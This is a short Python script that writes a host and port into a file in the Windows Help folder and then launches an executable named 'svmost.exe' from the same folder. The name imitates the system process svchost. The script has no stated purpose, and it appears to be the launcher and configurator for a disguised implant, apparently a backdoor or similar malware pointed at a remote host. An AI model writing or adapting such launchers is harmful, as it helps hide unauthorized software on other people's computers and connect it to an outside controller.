import sys
import os

conf_path="C:\WINDOWS\Help\wmconf"
exe_command="C:\WINDOWS\Help\svmost.exe local"
host=""
port=""

def main():
    global host,port
    try:
        os.remove(conf_path)
    except OSError:
        pass

    with open(conf_path, "w") as cfp:
        cfp.write(host)
        cfp.write("\n")
        cfp.write(port)
    os.system(exe_command)

if __name__ == '__main__':
    main()
